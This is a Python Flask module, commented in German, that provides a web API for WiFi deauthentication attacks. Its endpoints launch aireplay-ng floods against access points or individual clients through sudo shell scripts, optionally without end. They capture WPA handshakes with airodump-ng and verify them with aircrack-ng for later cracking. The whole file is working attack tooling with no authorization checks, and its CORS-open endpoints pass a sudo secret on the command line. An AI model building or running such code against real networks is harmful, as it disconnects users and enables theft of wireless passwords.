import os
import uuid
import subprocess
import netifaces
from datetime import datetime
from flask import Blueprint, request, jsonify, current_app
from flask_cors import cross_origin
from subprocess import TimeoutExpired

from api.app import db
from api.models import DeauthAction

deauth_bp = Blueprint('deauth_bp', __name__)

# Speichert laufende infinite Deauth-Prozesse: key="{scan_id}|{mac}"
RUNNING: dict[str, tuple[subprocess.Popen, subprocess.Popen | None]] = {}

def has_handshake(handshake_file: str) -> bool:
    try:
        result = subprocess.run(
            ['aircrack-ng', '-J', '/tmp/handshake_check', handshake_file],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=30
        )
        return '(1 handshake)' in result.stdout
    except (subprocess.CalledProcessError, TimeoutExpired):
        return False

@deauth_bp.route('/deauth/start', methods=['POST', 'OPTIONS'])
@cross_origin()
def start_deauth():
    if request.method == 'OPTIONS':
        return '', 200

    data         = request.get_json() or {}
    raw_duration = data.get('duration')
    duration     = int(raw_duration) if raw_duration is not None else 0
    infinite     = bool(data.get('infinite', False)) or duration <= 0

    mac       = data.get('mac')
    is_client = data.get('is_client', False)
    packets   = int(data.get('packets', 10))
    channel   = int(data.get('channel', 1))
    scan_id   = data.get('scan_id')
    secret    = current_app.config.get('SUDO_SECRET', '')

    if not mac:
        return jsonify({'error': 'MAC-Adresse erforderlich'}), 400

    interface = current_app.config.get('DEAUTH_INTERFACE', 'wlan1')
    if interface not in netifaces.interfaces():
        current_app.logger.warning(f"Schnittstelle {interface} nicht gefunden, fahre dennoch fort")

    # Scripts
    base     = os.path.abspath(os.path.join(os.path.dirname(__file__), '../scripts'))
    aireplay = os.path.join(base, 'aireplay-ng_deauth.sh')
    airodump = os.path.join(base, 'airodump-ng_handshake.sh')

    uid          = uuid.uuid4().hex
    cap_pref     = f"handshake_scan_ap_{mac.replace(':','').lower()}_{uid}"
    handshake_file = os.path.abspath(
        os.path.join(os.path.dirname(__file__), f"../scans/{cap_pref}-01.cap")
    )

    current_app.logger.info(f"🔌 Deauth AP {mac}, infinite={infinite}, duration={duration}s")

    # optional Mitschnitt
    airodump_proc = None
    if not is_client and packets < 9999 and not infinite:
        cmd = ['sudo','-n','bash', airodump, interface, cap_pref,
               mac, str(duration), str(channel), secret]
        airodump_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Deauth
    cmd = ['sudo','-n','bash', aireplay, interface, mac,
           str(packets), str(channel), secret]
    deauth_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if not infinite:
        try:
            deauth_proc.wait(timeout=duration + 5)
        except TimeoutExpired:
            current_app.logger.warning("Timeout beim Deauth-Prozess")
        if airodump_proc:
            try:
                airodump_proc.wait(timeout=duration + 5)
            except TimeoutExpired:
                current_app.logger.warning("Timeout beim Mitschnitt")
    else:
        RUNNING[f"{scan_id}|{mac}"] = (deauth_proc, airodump_proc)

    # Nur wenn finite: auf Handshake prüfen
    handshake_found = False if infinite else has_handshake(handshake_file)

    # **WICHTIG**: duration immer als int schreiben (0 = infinite)
    action = DeauthAction(
        scan_id       = scan_id,
        mac           = mac,
        is_client     = is_client,
        packets       = packets,
        duration      = 0 if infinite else duration,
        result_file   = handshake_file if handshake_found else None,
        handshake_file= handshake_file if handshake_found else None,
        success       = handshake_found,
        started_at    = datetime.utcnow()
    )
    db.session.add(action)
    db.session.commit()

    return jsonify({
        'message': f"Deauth gestartet{' (infinite)' if infinite else ''}",
        'file': handshake_file if handshake_found else None
    }), 200

@deauth_bp.route('/deauth/start_deauth_client', methods=['POST', 'OPTIONS'])
@cross_origin()
def start_deauth_client():
    if request.method == 'OPTIONS':
        return '', 200

    data         = request.get_json() or {}
    current_app.logger.info(f"[DEBUG] start_deauth_client received JSON: {data!r}")

    scan_id     = data.get('scan_id')
    ap_mac      = data.get('ap_mac')
    client_mac  = data.get('client_mac')
    packets     = int(data.get('packets', 10))
    raw_duration= data.get('duration')
    duration    = int(raw_duration) if raw_duration is not None else 0
    infinite    = bool(data.get('infinite', False)) or duration <= 0
    channel     = int(data.get('channel', 6))
    secret      = current_app.config.get('SUDO_SECRET', '')

    if not (scan_id and ap_mac and client_mac):
        return jsonify({'error': 'scan_id, ap_mac und client_mac erforderlich'}), 400

    interface = current_app.config.get('DEAUTH_INTERFACE', 'wlan1')
    if interface not in netifaces.interfaces():
        current_app.logger.warning(f"Schnittstelle {interface} nicht gefunden, fahre dennoch fort")

    base      = os.path.abspath(os.path.join(os.path.dirname(__file__), '../scripts'))
    aireplay  = os.path.join(base, 'aireplay-ng_deauth_client.sh')
    airodump  = os.path.join(base, 'airodump-ng_handshake_client.sh')

    uid       = uuid.uuid4().hex
    cap_pref  = f"handshake_scan_client_{ap_mac.replace(':','').lower()}_{uid}"
    handshake_file = os.path.abspath(
        os.path.join(os.path.dirname(__file__), f"../scans/{cap_pref}-01.cap")
    )

    # Mitschnitt nur bei finite
    hs_proc = None
    if packets < 9999 and not infinite:
        cmd = ['sudo','-n','bash', airodump, interface, cap_pref,
               ap_mac, str(duration), str(channel), secret]
        hs_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Client-Deauth
    cmd = ['sudo','-n','bash', aireplay, interface,
           ap_mac, client_mac, str(packets), str(channel), secret]
    deauth_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if not infinite:
        try:
            deauth_proc.wait(timeout=duration + 5)
        except TimeoutExpired:
            current_app.logger.warning("Timeout beim Client-Deauth")
        if hs_proc:
            try:
                hs_proc.wait(timeout=duration + 5)
            except TimeoutExpired:
                current_app.logger.warning("Timeout beim Handshake-Client")
    else:
        RUNNING[f"{scan_id}|{client_mac}"] = (deauth_proc, hs_proc)

    handshake_found = False if infinite else has_handshake(handshake_file)

    action = DeauthAction(
        scan_id       = scan_id,
        mac           = client_mac,
        is_client     = True,
        packets       = packets,
        duration      = 0 if infinite else duration,
        result_file   = handshake_file if handshake_found else None,
        handshake_file= handshake_file if handshake_found else None,
        success       = handshake_found,
        started_at    = datetime.utcnow()
    )
    db.session.add(action)
    db.session.commit()

    return jsonify({
        'message': f"Client-Deauth gestartet{' (infinite)' if infinite else ''}",
        'file': handshake_file if handshake_found else None
    }), 200

@deauth_bp.route('/deauth/stop', methods=['POST'])
@cross_origin()
def stop_deauth():
    data    = request.get_json() or {}
    scan_id = data.get('scan_id')
    mac     = data.get('mac')
    if not (scan_id and mac):
        return jsonify({'error': 'scan_id und mac erforderlich'}), 400

    key = f"{scan_id}|{mac}"
    procs = RUNNING.pop(key, None)
    if not procs:
        return jsonify({'error': 'Kein laufender Deauth-Prozess gefunden'}), 400

    deauth_proc, hs_proc = procs
    for p in (deauth_proc, hs_proc):
        if p and p.poll() is None:
            try:
                p.terminate()
            except:
                pass

    return jsonify({'message': 'Deauth gestoppt'}), 200
